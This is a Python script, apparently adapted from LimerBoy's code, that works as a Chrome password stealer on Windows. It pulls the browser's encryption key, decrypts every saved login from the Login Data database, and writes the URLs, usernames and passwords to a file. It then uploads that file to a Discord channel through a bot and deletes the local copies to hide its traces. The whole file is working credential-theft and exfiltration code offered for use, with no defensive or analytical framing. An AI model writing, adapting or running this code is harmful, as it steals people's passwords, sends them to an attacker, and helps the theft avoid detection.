#Full Credits to LimerBoy
import os
import re
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import discord

#GLOBAL CONSTANT
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))

def get_secret_key():
    try:
        #(1) Get secretkey from chrome local state
        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        #Remove suffix DPAPI
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome secretkey cannot be found")
        return None
    
def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        #(3-a) Initialisation vector for AES decryption
        initialisation_vector = ciphertext[3:15]
        #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
        #Encrypted password is 192 bits
        encrypted_password = ciphertext[15:-16]
        #(4) Build the cipher to decrypt the ciphertext
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        pass
    
def get_db_connection(chrome_path_login_db):
    try:
        print(chrome_path_login_db)
        shutil.copy2(chrome_path_login_db, r"E:\Codeing\Python Language\Projects\Project_17\Loginvault.db") 
        return sqlite3.connect(r"E:\Codeing\Python Language\Projects\Project_17\Loginvault.db")
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome database cannot be found")
        return None
    
def Password_Fetch_API(File):
    TOKEN = ''
    CHANNEL_ID = 1206955833410330635 
    intents = discord.Intents.default()
    intents.messages = True
    intents.guilds = True
    
    client = discord.Client(intents=intents)
    
    @client.event
    async def on_ready():
        print(f'We have logged in as {client.user}')
        await Upload(File)
        await client.close()
    
    async def Upload(file_path):
        channel = client.get_channel(CHANNEL_ID)
    
        with open(file_path, 'rb') as f:
            picture = discord.File(f)
            await channel.send(file=picture)
    
    client.run(TOKEN)
def Remove_Traces():
    os.remove(r"E:\Codeing\Python Language\Projects\Project_17\Loginvault.db")
    os.remove(r"E:\Codeing\Python Language\Projects\Project_17\DCP_PASS.txt")

    

try:
    File_Path=r"E:\Codeing\Python Language\Projects\Project_17\DCP_PASS.txt"
    # Create a text file to store passwords
    with open(File_Path, mode='w', encoding='utf-8') as decrypt_password_file:
        #(1) Get secret key
        secret_key = get_secret_key()
        # Search user profile or default folder (this is where the encrypted login password is stored)
        folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
        for folder in folders:
            #(2) Get ciphertext from sqlite database
            chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
            conn = get_db_connection(chrome_path_login_db)
            if(secret_key and conn):
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for index,login in enumerate(cursor.fetchall()):
                    url = login[0]
                    username = login[1]
                    ciphertext = login[2]
                    if(url!="" and username!="" and ciphertext!=""):
                        #(3) Filter the initialisation vector & encrypted password from ciphertext 
                        #(4) Use AES algorithm to decrypt the password
                        decrypted_password = decrypt_password(ciphertext, secret_key)
                        decrypt_password_file.write(f"Serial: {index}\n")
                        decrypt_password_file.write(f"URL: {url}\nUser: {username}\nPassword: {decrypted_password}\n\n")
                        decrypt_password_file.write("=" * 50 + "\n")
                # Close database connection
                cursor.close()
                conn.close()
    Password_Fetch_API(File_Path)
    Remove_Traces()

except Exception as e:
    print(e)